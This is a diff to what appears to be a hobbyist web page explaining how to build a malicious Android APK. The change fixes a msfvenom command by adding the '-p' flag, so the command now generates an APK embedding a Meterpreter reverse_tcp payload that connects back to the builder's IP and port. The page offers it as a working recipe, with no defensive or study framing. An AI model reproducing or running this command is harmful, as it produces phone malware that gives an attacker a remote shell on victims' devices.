@@ -42,7 +42,7 @@ We should mention the LHOST and LPORT also which are seperate for every computer
 
 To create your own apk like this:-
   1. Open metasploit framework.In linux based systems. 
-  2. Then run this command:- msfvenom android/meterpreter/reverse_tcp LHOST=(your computer ip addrs) LPORT=(any 4 numbers which you should remember) R>filename.apk
+  2. Then run this command:- msfvenom -p android/meterpreter/reverse_tcp LHOST=(your computer ip addrs) LPORT=(any 4 numbers which you should remember) R>filename.apk
 
 THANKS FOR VISITING MY SITE......
     BYE.......</p>
